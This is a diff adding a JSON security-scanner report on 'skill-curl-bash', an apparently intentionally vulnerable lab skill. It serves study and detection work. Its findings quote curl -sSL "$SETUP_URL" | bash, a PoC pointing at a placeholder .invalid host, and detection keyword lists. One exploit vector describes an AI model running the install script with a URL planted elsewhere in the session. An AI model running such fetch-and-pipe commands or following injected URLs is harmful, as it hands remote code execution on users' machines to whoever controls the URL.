@@ -1,0 +1,937 @@
+{
+  "skill": {
+    "name": "skill-curl-bash",
+    "source": "/Users/river/Projects/mcp-vulnlab/corpus/skills/skill-curl-bash",
+    "scanned_at": "2026-09-12T15:14:47.022949+00:00"
+  },
+  "risk_assessment": {
+    "score": 77,
+    "severity": "HIGH",
+    "recommendation": "DO_NOT_INSTALL",
+    "max_issue_severity": "HIGH"
+  },
+  "components": [
+    {
+      "path": "README.md",
+      "type": "markdown",
+      "lines": 40,
+      "executable": false,
+      "size_bytes": 1394,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    },
+    {
+      "path": "SKILL.md",
+      "type": "markdown",
+      "lines": 19,
+      "executable": false,
+      "size_bytes": 499,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    },
+    {
+      "path": "exploits.json",
+      "type": "json",
+      "lines": 101,
+      "executable": false,
+      "size_bytes": 5664,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    },
+    {
+      "path": "manifest.json",
+      "type": "json",
+      "lines": 12,
+      "executable": false,
+      "size_bytes": 640,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    },
+    {
+      "path": "requirements.txt",
+      "type": "text",
+      "lines": 6,
+      "executable": false,
+      "size_bytes": 185,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    },
+    {
+      "path": "scripts/install.sh",
+      "type": "shell",
+      "lines": 16,
+      "executable": true,
+      "size_bytes": 528,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    }
+  ],
+  "structured_summaries": [],
+  "issues": [
+    {
+      "id": "SC2",
+      "finding_id": "finding-2418673d2b7249b9b5fdd9c39a6241c1",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "README.md",
+        "start_line": 17,
+        "end_line": null
+      },
+      "finding": "curl | bash",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "      \"category\": \"supply-chain\",\n      \"severity\": \"critical\",\n      \"tool\": \"scripts/install.sh\",\n      \"description\": \"The install script executes `curl -sSL <url> | bash` with a caller-overridable URL and no signature, checksum, allowlist, or pinned version. Whatever the endpoint serves is executed as shell code in the user's context. The classic `curl | bash` pattern trades all integrity guarantees for one line of convenience.\",\n      \"impact\": \"Arbitrary code execution at the user's privilege level. An attacker who controls the URL \u2014 or a registry that later hosts a compromised package at the same name \u2014 executes anything on the machine, with no audit trail of what was fetched.\",\n      \"exploit\": {\n        \"vector\": \"The model runs `scripts/install.sh` following the skill's instructions; the URL can be supplied by content elsewhere in the session.\",",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "168eba54cf9c46bdfdf92dc99f5601a5c586eefb42777252c6a56fc1230c236b",
+      "occurrences": [
+        {
+          "file": "README.md",
+          "start_line": 17,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC2",
+      "finding_id": "finding-2418673d2b7249b9b5fdd9c39a6241c1",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "exploits.json",
+        "start_line": 11,
+        "end_line": null
+      },
+      "finding": "curl | bash",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "      \"category\": \"supply-chain\",\n      \"severity\": \"critical\",\n      \"tool\": \"scripts/install.sh\",\n      \"description\": \"The install script executes `curl -sSL <url> | bash` with a caller-overridable URL and no signature, checksum, allowlist, or pinned version. Whatever the endpoint serves is executed as shell code in the user's context. The classic `curl | bash` pattern trades all integrity guarantees for one line of convenience.\",\n      \"impact\": \"Arbitrary code execution at the user's privilege level. An attacker who controls the URL \u2014 or a registry that later hosts a compromised package at the same name \u2014 executes anything on the machine, with no audit trail of what was fetched.\",\n      \"exploit\": {\n        \"vector\": \"The model runs `scripts/install.sh` following the skill's instructions; the URL can be supplied by content elsewhere in the session.\",",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "168eba54cf9c46bdfdf92dc99f5601a5c586eefb42777252c6a56fc1230c236b",
+      "occurrences": [
+        {
+          "file": "exploits.json",
+          "start_line": 11,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC2",
+      "finding_id": "finding-2418673d2b7249b9b5fdd9c39a6241c1",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "exploits.json",
+        "start_line": 25,
+        "end_line": null
+      },
+      "finding": "curl | bash",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "      \"category\": \"supply-chain\",\n      \"severity\": \"critical\",\n      \"tool\": \"scripts/install.sh\",\n      \"description\": \"The install script executes `curl -sSL <url> | bash` with a caller-overridable URL and no signature, checksum, allowlist, or pinned version. Whatever the endpoint serves is executed as shell code in the user's context. The classic `curl | bash` pattern trades all integrity guarantees for one line of convenience.\",\n      \"impact\": \"Arbitrary code execution at the user's privilege level. An attacker who controls the URL \u2014 or a registry that later hosts a compromised package at the same name \u2014 executes anything on the machine, with no audit trail of what was fetched.\",\n      \"exploit\": {\n        \"vector\": \"The model runs `scripts/install.sh` following the skill's instructions; the URL can be supplied by content elsewhere in the session.\",",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "168eba54cf9c46bdfdf92dc99f5601a5c586eefb42777252c6a56fc1230c236b",
+      "occurrences": [
+        {
+          "file": "exploits.json",
+          "start_line": 25,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC2",
+      "finding_id": "finding-d65d2f56b6984a6e8f4d57e1f0892a7a",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "exploits.json",
+        "start_line": 11,
+        "end_line": null
+      },
+      "finding": "curl -sSL <url> | bash",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "      \"category\": \"supply-chain\",\n      \"severity\": \"critical\",\n      \"tool\": \"scripts/install.sh\",\n      \"description\": \"The install script executes `curl -sSL <url> | bash` with a caller-overridable URL and no signature, checksum, allowlist, or pinned version. Whatever the endpoint serves is executed as shell code in the user's context. The classic `curl | bash` pattern trades all integrity guarantees for one line of convenience.\",\n      \"impact\": \"Arbitrary code execution at the user's privilege level. An attacker who controls the URL \u2014 or a registry that later hosts a compromised package at the same name \u2014 executes anything on the machine, with no audit trail of what was fetched.\",\n      \"exploit\": {\n        \"vector\": \"The model runs `scripts/install.sh` following the skill's instructions; the URL can be supplied by content elsewhere in the session.\",",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "8f10f0b83ee375a02f38e0cbd621f96794131d0a61ca1dfbb093108035657758",
+      "occurrences": [
+        {
+          "file": "exploits.json",
+          "start_line": 11,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC2",
+      "finding_id": "finding-d4d76a8dde8d447abb035ba10acf3527",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "exploits.json",
+        "start_line": 16,
+        "end_line": null
+      },
+      "finding": "curl -sSL ... | bash",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "      \"exploit\": {\n        \"vector\": \"The model runs `scripts/install.sh` following the skill's instructions; the URL can be supplied by content elsewhere in the session.\",\n        \"steps\": [\n          \"Open corpus/skills/skill-curl-bash/scripts/install.sh and locate the `curl -sSL ... | bash` line.\",\n          \"Observe that no checksum, signature, or allowlist is verified before execution.\",\n          \"Point a skill scanner at the directory and note whether it flags the fetch-and-execute pattern.\",\n          \"The PoC does not execute remote code: the URL is .invalid and the script requires ALLOW_REMOTE_EXEC=1 to proceed.\"",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "605967d21935bfc72624c008ec0eb32b1fa6732d5f8273f538f73039d3aad549",
+      "occurrences": [
+        {
+          "file": "exploits.json",
+          "start_line": 16,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC2",
+      "finding_id": "finding-8345a371fbe94615b75c7c60aff75937",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "exploits.json",
+        "start_line": 21,
+        "end_line": null
+      },
+      "finding": "curl -sSL \\\"${SETUP_URL:-https://setup.example.invalid/install.sh}\\\" | bash",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "          \"Point a skill scanner at the directory and note whether it flags the fetch-and-execute pattern.\",\n          \"The PoC does not execute remote code: the URL is .invalid and the script requires ALLOW_REMOTE_EXEC=1 to proceed.\"\n        ],\n        \"poc\": \"curl -sSL \\\"${SETUP_URL:-https://setup.example.invalid/install.sh}\\\" | bash\"\n      },\n      \"detection\": {\n        \"signals\": [",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "9358d81dec030dc31f52a29dc6c98dfbcb9a3c6252ee7b73bda9c4ce689b2587",
+      "occurrences": [
+        {
+          "file": "exploits.json",
+          "start_line": 21,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC2",
+      "finding_id": "finding-42601b746e28453ea837cb3d6cf6468b",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "exploits.json",
+        "start_line": 26,
+        "end_line": null
+      },
+      "finding": "curl -ssl\",\n          \"pipe to bash\",\n          \"remote script execution\",\n          \"remote code\",\n          \"supply chain\",\n          \"no checksum\"\n        ],\n        \"static_hints\": [\n          \"`c",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "      \"detection\": {\n        \"signals\": [\n          \"curl | bash\",\n          \"curl -ssl\",\n          \"pipe to bash\",\n          \"remote script execution\",\n          \"remote code\",",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "f43fc9c2cd38db99526f1d6dc5f7db4070ef88ef931cf833e59b11b6e986ae5f",
+      "occurrences": [
+        {
+          "file": "exploits.json",
+          "start_line": 26,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC2",
+      "finding_id": "finding-8d2a7523fb014844a10e03db5a94cc91",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "README.md",
+        "start_line": 18,
+        "end_line": null
+      },
+      "finding": "curl -sSL \"$SETUP_URL\" | bash",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "fi\n\n# VULNERABLE (SKLV-003): remote code fetched and executed with no integrity check.\ncurl -sSL \"$SETUP_URL\" | bash\n\necho \"toolchain installed\"",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "d707786e1afbd91efea3416e62c6f1a02dec66ed24e4afd9dbc6b075a681ca31",
+      "occurrences": [
+        {
+          "file": "README.md",
+          "start_line": 18,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC2",
+      "finding_id": "finding-8d2a7523fb014844a10e03db5a94cc91",
+      "category": "Supply Chain",
+      "pattern": "External Script Fetching",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "scripts/install.sh",
+        "start_line": 14,
+        "end_line": null
+      },
+      "finding": "curl -sSL \"$SETUP_URL\" | bash",
+      "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+      "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+      "code_snippet": "fi\n\n# VULNERABLE (SKLV-003): remote code fetched and executed with no integrity check.\ncurl -sSL \"$SETUP_URL\" | bash\n\necho \"toolchain installed\"",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "d707786e1afbd91efea3416e62c6f1a02dec66ed24e4afd9dbc6b075a681ca31",
+      "occurrences": [
+        {
+          "file": "scripts/install.sh",
+          "start_line": 14,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "TM2",
+      "finding_id": "finding-c7884516c49047a081b65e00f74d1a95",
+      "category": "Tool Misuse",
+      "pattern": "Chaining Abuse",
+      "severity": "HIGH",
+      "confidence": 0.7,
+      "location": {
+        "file": "scripts/install.sh",
+        "start_line": 14,
+        "end_line": null
+      },
+      "finding": "| bash\n",
+      "explanation": "Tool calls are chained to bypass individual safety checks or escalate capabilities beyond what any single tool call would allow.",
+      "remediation": "Limit tool chaining depth and validate the output of each tool before passing it to the next. Require explicit user approval for multi-step chains.",
+      "code_snippet": "fi\n\n# VULNERABLE (SKLV-003): remote code fetched and executed with no integrity check.\ncurl -sSL \"$SETUP_URL\" | bash\n\necho \"toolchain installed\"",
+      "intent": null,
+      "tags": [
+        "Tool Misuse"
+      ],
+      "evidence": {},
+      "match_fingerprint": "04c6c3d162d775e86218721a59c0fde586c2bacf502ea9bb612977f2736a0c66",
+      "occurrences": [
+        {
+          "file": "scripts/install.sh",
+          "start_line": 14,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "LP3",
+      "finding_id": "finding-04ab1bc8f04e43c49e3f9820aed06ec0",
+      "category": "MCP Least Privilege",
+      "pattern": null,
+      "severity": "MEDIUM",
+      "confidence": 0.7,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 1,
+        "end_line": null
+      },
+      "finding": null,
+      "explanation": "Without declared permissions the skill's intent is opaque and cannot be validated.",
+      "remediation": "Declare the skill's tool scope: for Claude Code / Agent Skills SKILL.md, list the tools the skill may invoke in the 'allowed-tools' frontmatter field; for MCP server manifests, add a 'permissions' list naming the required capabilities.",
+      "code_snippet": null,
+      "intent": null,
+      "tags": [
+        "ASI02"
+      ],
+      "evidence": {},
+      "match_fingerprint": null,
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 1,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC1",
+      "finding_id": "finding-d314533b46584d3493d7c56a122bf517",
+      "category": "Supply Chain",
+      "pattern": "Unpinned Dependencies",
+      "severity": "LOW",
+      "confidence": 0.6,
+      "location": {
+        "file": "requirements.txt",
+        "start_line": 3,
+        "end_line": null
+      },
+      "finding": "requests",
+      "explanation": "Dependencies lack version pinning, allowing potential malicious package updates. Consider pinning versions.",
+      "remediation": "Pin all dependency versions in requirements.txt or pyproject.toml. Use exact versions (==) or compatible ranges. Run pip-audit regularly.",
+      "code_snippet": "# Intentionally bad dependency manifest \u2014 part of the SKLV-004 challenge.\n# Every entry floats: no version pins, no hashes, no lockfile in this directory.\nrequests\npyyaml\nclick\nhttpx",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "6e256e7076a0cac063454c717f1df944a851308d6f40181450854ab6f7decb0a",
+      "occurrences": [
+        {
+          "file": "requirements.txt",
+          "start_line": 3,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC4",
+      "finding_id": "finding-b20444aff95841029edfce767d7174f0",
+      "category": "Supply Chain",
+      "pattern": "Unverifiable Dependency: requests has 16 known advisory(ies) (CVE-2014-1830 (Exposure of Sensitive Information to an Unauthorized Actor in Requests); CVE-2024-47081 (Requests vulnerable to .netrc credentials leak via malicious URLs); CVE-2024-35195 (Requests `Session` object does not verify requests after making first request wi) +13 more), but the manifest does not pin a version, so it is unknown whether the installed release is affected",
+      "severity": "LOW",
+      "confidence": 0.4,
+      "location": {
+        "file": "requirements.txt",
+        "start_line": 3,
+        "end_line": null
+      },
+      "finding": "requests",
+      "explanation": "Dependency has known vulnerabilities (CVEs). Using packages with unpatched security flaws exposes the environment to known exploits.",
+      "remediation": "Update the dependency to a patched version that addresses the known CVE. Check OSV (osv.dev) or NVD for details on the vulnerability.",
+      "code_snippet": null,
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "09deeb6fdb55899e7b284b11a4a1f240e895ab350d9ef10d889ca4cada77cadd",
+      "occurrences": [
+        {
+          "file": "requirements.txt",
+          "start_line": 3,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC1",
+      "finding_id": "finding-7a3885826dfa4ab686e50a751e24516f",
+      "category": "Supply Chain",
+      "pattern": "Unpinned Dependencies",
+      "severity": "LOW",
+      "confidence": 0.6,
+      "location": {
+        "file": "requirements.txt",
+        "start_line": 4,
+        "end_line": null
+      },
+      "finding": "pyyaml",
+      "explanation": "Dependencies lack version pinning, allowing potential malicious package updates. Consider pinning versions.",
+      "remediation": "Pin all dependency versions in requirements.txt or pyproject.toml. Use exact versions (==) or compatible ranges. Run pip-audit regularly.",
+      "code_snippet": "# Intentionally bad dependency manifest \u2014 part of the SKLV-004 challenge.\n# Every entry floats: no version pins, no hashes, no lockfile in this directory.\nrequests\npyyaml\nclick\nhttpx",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "5a8f900e3903bfe1424f11066d3916fb8cc1ee980523c572525dc74fad35f772",
+      "occurrences": [
+        {
+          "file": "requirements.txt",
+          "start_line": 4,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC4",
+      "finding_id": "finding-21f2999f55ee4039b2959e8c79cdd80b",
+      "category": "Supply Chain",
+      "pattern": "Unverifiable Dependency: pyyaml has 8 known advisory(ies) (CVE-2019-20477 (Deserialization of Untrusted Data in PyYAML); CVE-2020-1747 (Improper Input Validation in PyYAML); CVE-2020-14343 (Improper Input Validation in PyYAML) +5 more), but the manifest does not pin a version, so it is unknown whether the installed release is affected",
+      "severity": "LOW",
+      "confidence": 0.4,
+      "location": {
+        "file": "requirements.txt",
+        "start_line": 4,
+        "end_line": null
+      },
+      "finding": "pyyaml",
+      "explanation": "Dependency has known vulnerabilities (CVEs). Using packages with unpatched security flaws exposes the environment to known exploits.",
+      "remediation": "Update the dependency to a patched version that addresses the known CVE. Check OSV (osv.dev) or NVD for details on the vulnerability.",
+      "code_snippet": null,
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "63d3785d38c76088e3330226a537403e99607363507ca953b3b9cef01fb72913",
+      "occurrences": [
+        {
+          "file": "requirements.txt",
+          "start_line": 4,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC1",
+      "finding_id": "finding-c783b0d38d914cdcbbd358806062114a",
+      "category": "Supply Chain",
+      "pattern": "Unpinned Dependencies",
+      "severity": "LOW",
+      "confidence": 0.6,
+      "location": {
+        "file": "requirements.txt",
+        "start_line": 5,
+        "end_line": null
+      },
+      "finding": "click",
+      "explanation": "Dependencies lack version pinning, allowing potential malicious package updates. Consider pinning versions.",
+      "remediation": "Pin all dependency versions in requirements.txt or pyproject.toml. Use exact versions (==) or compatible ranges. Run pip-audit regularly.",
+      "code_snippet": "# Every entry floats: no version pins, no hashes, no lockfile in this directory.\nrequests\npyyaml\nclick\nhttpx",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "3c9c873dc8e35e9d04809958ed78a89e69ec96c2a2680cec504f087190826fd8",
+      "occurrences": [
+        {
+          "file": "requirements.txt",
+          "start_line": 5,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC4",
+      "finding_id": "finding-b6cc4460035d4cdbace8f765ee2e209f",
+      "category": "Supply Chain",
+      "pattern": "Unverifiable Dependency: click has 1 known advisory(ies) (CVE-2026-7246 (Pallets Click, versions 8.3.2 and below, contain a command injection vulnerabili)), but the manifest does not pin a version, so it is unknown whether the installed release is affected",
+      "severity": "LOW",
+      "confidence": 0.4,
+      "location": {
+        "file": "requirements.txt",
+        "start_line": 5,
+        "end_line": null
+      },
+      "finding": "click",
+      "explanation": "Dependency has known vulnerabilities (CVEs). Using packages with unpatched security flaws exposes the environment to known exploits.",
+      "remediation": "Update the dependency to a patched version that addresses the known CVE. Check OSV (osv.dev) or NVD for details on the vulnerability.",
+      "code_snippet": null,
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "b922bbc4d2d2ef8e52ea5a5adb21ef83e2e74bb7befe1ecdae84f28e0f268f23",
+      "occurrences": [
+        {
+          "file": "requirements.txt",
+          "start_line": 5,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC1",
+      "finding_id": "finding-b44fa83575a94f5f9401a3fc868a92a0",
+      "category": "Supply Chain",
+      "pattern": "Unpinned Dependencies",
+      "severity": "LOW",
+      "confidence": 0.6,
+      "location": {
+        "file": "requirements.txt",
+        "start_line": 6,
+        "end_line": null
+      },
+      "finding": "httpx\n",
+      "explanation": "Dependencies lack version pinning, allowing potential malicious package updates. Consider pinning versions.",
+      "remediation": "Pin all dependency versions in requirements.txt or pyproject.toml. Use exact versions (==) or compatible ranges. Run pip-audit regularly.",
+      "code_snippet": "requests\npyyaml\nclick\nhttpx",
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "5e28ef459dd3748d2d07b0cd665fef770e4d82969a50a2a3b31c3381d93d9a1b",
+      "occurrences": [
+        {
+          "file": "requirements.txt",
+          "start_line": 6,
+          "end_line": null
+        }
+      ]
+    },
+    {
+      "id": "SC4",
+      "finding_id": "finding-1c101a3f54674588affd3657d7a317c1",
+      "category": "Supply Chain",
+      "pattern": "Unverifiable Dependency: httpx has 2 known advisory(ies) (CVE-2021-41945 (Improper Input Validation in httpx); CVE-2021-41945 (Encode OSS httpx <=1.0.0.beta0 is affected by improper input validation in `http)), but the manifest does not pin a version, so it is unknown whether the installed release is affected",
+      "severity": "LOW",
+      "confidence": 0.4,
+      "location": {
+        "file": "requirements.txt",
+        "start_line": 6,
+        "end_line": null
+      },
+      "finding": "httpx",
+      "explanation": "Dependency has known vulnerabilities (CVEs). Using packages with unpatched security flaws exposes the environment to known exploits.",
+      "remediation": "Update the dependency to a patched version that addresses the known CVE. Check OSV (osv.dev) or NVD for details on the vulnerability.",
+      "code_snippet": null,
+      "intent": null,
+      "tags": [
+        "Supply Chain"
+      ],
+      "evidence": {},
+      "match_fingerprint": "1880e6466aae37654e222d1c2e56c30109a9d99ffcc006befabe1450907c9bfa",
+      "occurrences": [
+        {
+          "file": "requirements.txt",
+          "start_line": 6,
+          "end_line": null
+        }
+      ]
+    }
+  ],
+  "suppressed_count": 0,
+  "suppressed": [],
+  "metadata": {
+    "has_executable_scripts": true,
+    "skillspector_version": "2.11.2",
+    "llm_requested": false,
+    "llm_available": false,
+    "meta_analysis_applied": false,
+    "inference_usage": [],
+    "filtering_mode": "heuristic"
+  },
+  "execution_successful": true,
+  "analysis_completeness": {
+    "total_components": 6,
+    "scanned_components": 6,
+    "coverage_percent": 100.0,
+    "is_complete": true,
+    "status": "complete",
+    "execution_successful": true,
+    "fully_inspected_files": 6,
+    "partially_inspected_files": 0,
+    "entirely_uninspected_files": 0,
+    "ledger_exceptions": [],
+    "scope_exclusions": [],
+    "analyzer_statuses": [
+      {
+        "analyzer_id": "artifact_integrity",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "behavioral_ast",
+        "status": "not_applicable",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "no_applicable_files",
+        "message": "No files matched this analyzer's applicability contract."
+      },
+      {
+        "analyzer_id": "behavioral_taint_tracking",
+        "status": "not_applicable",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "no_applicable_files",
+        "message": "No files matched this analyzer's applicability contract."
+      },
+      {
+        "analyzer_id": "bundled_execution_surface",
+        "status": "not_applicable",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "no_applicable_files",
+        "message": "No files matched this analyzer's applicability contract."
+      },
+      {
+        "analyzer_id": "mcp_least_privilege",
+        "status": "completed",
+        "planned_work": 2,
+        "completed": 2,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "mcp_rug_pull",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "mcp_tool_poisoning",
+        "status": "completed",
+        "planned_work": 1,
+        "completed": 1,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "meta_analyzer",
+        "status": "disabled",
+        "planned_work": 0,
+        "completed": 0,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0,
+        "reason_code": "disabled_by_configuration",
+        "message": "Analyzer was disabled by the requested configuration."
+      },
+      {
+        "analyzer_id": "static_patterns_agent_snooping",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_anti_refusal",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_data_exfiltration",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_deserialization",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_excessive_agency",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_harmful_content",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_memory_poisoning",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_output_handling",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_privilege_escalation",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_prompt_injection",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_rogue_agent",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_ssrf",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_supply_chain",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_patterns_system_prompt_leakage",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
